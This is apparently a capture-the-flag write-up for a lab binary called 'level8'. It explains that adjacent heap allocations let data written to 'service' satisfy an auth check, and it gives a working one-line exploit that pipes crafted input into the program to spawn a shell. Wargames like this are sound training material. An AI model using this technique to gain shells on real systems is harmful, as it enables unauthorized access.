Exploit: Hard-coded condition to access the `system("\bin\sh")`.

The condition is `auth[0x20] != NULL`. We just have to write some data in `service` since it is placed write after auth in the memory.

```
   ((echo "auth AAAA"; python -c 'print "service " + "B" * 16'; echo "login"); echo "whoami") | ./level8 
```